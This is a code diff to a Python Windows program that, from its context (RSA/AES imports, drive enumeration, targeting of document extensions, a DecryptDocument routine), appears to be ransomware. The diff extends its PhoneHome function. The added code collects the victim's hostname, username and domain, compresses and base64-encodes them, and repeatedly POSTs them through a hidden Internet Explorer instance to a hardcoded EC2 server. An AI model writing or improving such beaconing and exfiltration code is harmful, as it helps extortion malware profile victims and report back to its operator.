@@ -6,8 +6,10 @@ import win32com.client
 import time
 import sys
 import win32api
-from _winreg import *
+import zlib
+import base64
 
+from _winreg import *
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Cipher import AES
@@ -108,20 +110,46 @@ def DecryptDocument(document_path):
 		
 def PhoneHome():
 
+	def GetHostInfo():
+
+		hostname	= win32api.GetComputerName()
+		username 	= win32api.GetUserName()
+		domain 		= win32api.GetDomainName()
+
+		host_info 	= '{0}, {1}, {2}'.format(hostname, username, domain)
+		host_info	= zlib.compress(host_info)
+		host_info	= base64.b64encode(host_info)
+		postdata 	= buffer(host_info)
+		
+		return hostname, postdata
+		
 	def wait_for_browser(browser):
+	
 		while browser.ReadyState != 4 and browser.ReadyState != 'complete':
 			time.sleep(0.1)
 		return
 	
-	while True:
+	def Connect():
+	
 		ie = win32com.client.Dispatch('InternetExplorer.Application')
-		ie.Visible = 0
-		ie.Navigate('http://ec2-54-165-16-219.compute-1.amazonaws.com:8080')
-		wait_for_browser(ie)
 		
+		ie.Visible = 0
+		ie.Navigate(url, flags, target_frame, postdata, headers)
+		wait_for_browser(ie)
+
 		time.sleep(60)
 		ie.Quit()
 		ie = None
+		
+	url = 'http://ec2-54-165-16-219.compute-1.amazonaws.com:8080'
+	flags = 2
+	target_frame = ''
+	hostname, postdata = GetHostInfo()
+	headers = 'Content-Type: www-form-urlencoded\r\nHost: {0}\r\n'.format(hostname)
+
+	while True:
+		Connect()
+		
 	return
 	
 	
@@ -164,7 +192,7 @@ def GetDriveLetters():
 		
 	return drives
 	
-	
+
 if __name__ == '__main__':
 
 	target_extensions = ['.txt', '.docx', '.doc', '.xls', '.xlsx', '.ppt', '.pptx']
